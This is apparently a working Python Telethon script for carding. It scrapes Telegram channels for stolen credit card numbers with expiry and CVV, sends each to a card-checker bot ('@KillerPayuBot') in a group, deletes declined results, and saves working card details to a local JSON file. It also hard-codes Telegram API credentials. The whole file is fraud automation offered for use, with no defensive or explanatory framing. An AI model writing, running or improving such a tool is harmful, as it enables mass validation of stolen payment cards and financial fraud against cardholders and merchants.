import asyncio
from telethon import TelegramClient, events
import json
import os
import re
from datetime import datetime
import time

# Your API credentials
API_ID = 25714394
API_HASH = 'ad7bca22a916f92d7d9c7ca3646ef36d'

# File-based storage
PROCESSED_FILE = 'processed_messages.json'
SESSION_FILE = 'telegram_session'

# Settings - YE UPDATE KARNA HAI
TARGET_GROUP = "@afdsxgfhgf"  # Apna group username ya ID dalen
SOURCE_CHANNELS = [
    -1002930067925,  # Additional channels
]

# Bot settings
CHECKER_BOT = "@KillerPayuBot"
WAIT_FOR_REPLY = 15  # 5 seconds wait for bot reply
NEXT_POST_DELAY = 10  # 2 seconds after delete

# Counters
posted_count = 0
deleted_count = 0

class FileStorage:
    @staticmethod
    def load_json(filename):
        for _ in range(3):
            try:
                if os.path.exists(filename):
                    with open(filename, 'r', encoding='utf-8') as f:
                        return json.load(f)
                return {}
            except:
                time.sleep(0.1)
        return {}
    
    @staticmethod
    def save_json(filename, data):
        for _ in range(3):
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                return True
            except:
                time.sleep(0.1)
        return False

def init_storage():
    if not os.path.exists(PROCESSED_FILE):
        FileStorage.save_json(PROCESSED_FILE, {})

def extract_cc_details(text):
    """Extract CC details from message text"""
    if not text:
        return None
    
    # CC pattern: 16 digits | 2 digits | 2 digits | 3 digits
    cc_pattern = r'\b(\d{16}\|\d{2}\|\d{2}\|\d{3})\b'
    
    match = re.search(cc_pattern, text)
    if match:
        cc_details = match.group(1)
        return cc_details
    
    return None

def is_message_processed(message_signature):
    """Check if message is already processed using signature"""
    processed = FileStorage.load_json(PROCESSED_FILE)
    return message_signature in processed

def mark_message_processed(message_signature, cc_details):
    """Mark message as processed with CC details"""
    processed = FileStorage.load_json(PROCESSED_FILE)
    
    processed[message_signature] = {
        'cc_details': cc_details,
        'timestamp': datetime.now().isoformat(),
        'sent_to_group': True
    }
    
    FileStorage.save_json(PROCESSED_FILE, processed)

def print_stats():
    """Print current statistics"""
    print(f"\r📊 Posted: {posted_count} | Deleted: {deleted_count}", end="", flush=True)

async def send_and_wait_for_reply(client, cc_details):
    """Send CC to bot and wait for reply"""
    global posted_count, deleted_count
    
    try:
        # Send message to bot
        sent_message = await client.send_message(TARGET_GROUP, f".chk {cc_details}")
        posted_count += 1
        print_stats()
        
        # Wait for bot reply
        await asyncio.sleep(WAIT_FOR_REPLY)
        
        # Check for bot reply
        async for message in client.iter_messages(
            TARGET_GROUP, 
            limit=10,
            offset_id=sent_message.id - 1
        ):
            # Check if message is from bot and is a reply to our message
            if (message.sender_id and 
                (message.sender_id.username == CHECKER_BOT.replace('@', '') or 
                 message.text and CHECKER_BOT in message.text) and
                message.reply_to_msg_id == sent_message.id):
                
                # Check if status is "Declined"
                if "Status: Declined" in message.text:
                    # Delete our original message
                    await sent_message.delete()
                    deleted_count += 1
                    print_stats()
                    return "Declined"
                else:
                    return "approved"
        
        return "no_reply"
        
    except Exception as e:
        return "error"

async def setup_client():
    """Setup Telegram client"""
    client = TelegramClient(SESSION_FILE, API_ID, API_HASH)
    return client

async def process_source_channel(client, channel_id):
    """Process messages from a specific source channel"""
    try:
        # Get channel entity
        channel = await client.get_entity(channel_id)
        channel_name = getattr(channel, 'title', str(channel_id))
        
        print(f"\n📡 Checking: {channel_name}")
        
        # Scan all messages
        async for message in client.iter_messages(channel, limit=2000):
            text = message.text
            
            if not text:
                continue
            
            # Create unique signature for message
            message_signature = f"{channel_id}_{message.id}"
            
            # Extract CC details
            cc_details = extract_cc_details(text)
            
            if cc_details:
                # Check if already processed
                if is_message_processed(message_signature):
                    continue
                
                # Send to bot and check reply
                result = await send_and_wait_for_reply(client, cc_details)
                
                if result == "Declined":
                    mark_message_processed(message_signature, "Declined")
                else:
                    mark_message_processed(message_signature, cc_details)
                
                # Small delay before next CC
                await asyncio.sleep(NEXT_POST_DELAY)
        
        return True
        
    except Exception as e:
        return False

async def main():
    # Initialize storage
    init_storage()
    
    # Show existing processed count
    processed_data = FileStorage.load_json(PROCESSED_FILE)
    print(f"📋 Already processed: {len(processed_data)} messages")
    
    # Setup client
    client = await setup_client()
    
    await client.start()
    print("🚀 Bot Started")
    print("📊 Posted: 0 | Deleted: 0")
    
    # Message handler for NEW messages from source channels
    @client.on(events.NewMessage)
    async def handler(event):
        message = event.message
        chat_id = message.chat.id
        
        # Only process messages from source channels
        if chat_id not in SOURCE_CHANNELS:
            return
        
        text = message.text
        if not text:
            return
        
        # Create unique signature
        message_signature = f"{chat_id}_{message.id}"
        
        # Check if already processed
        if is_message_processed(message_signature):
            return
        
        # Extract CC details
        cc_details = extract_cc_details(text)
        
        if cc_details:
            # Send to bot and check reply
            result = await send_and_wait_for_reply(client, cc_details)
            
            if result == "declined":
                mark_message_processed(message_signature, "DECLINED")
            else:
                mark_message_processed(message_signature, cc_details)
            
            # Small delay before next potential CC
            await asyncio.sleep(NEXT_POST_DELAY)
    
    # Process existing messages from all source channels
    print("\n🕒 Scanning channels...")
    
    for channel_id in SOURCE_CHANNELS:
        await process_source_channel(client, channel_id)
    
    print(f"\n\n🎉 Completed!")
    print(f"📊 Final - Posted: {posted_count} | Deleted: {deleted_count}")
    print("👂 Monitoring...")
    
    # Keep monitoring
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n🛑 Stopped | Posted: {posted_count} | Deleted: {deleted_count}")
    except Exception as e:
        print(f"💥 Error: {e}")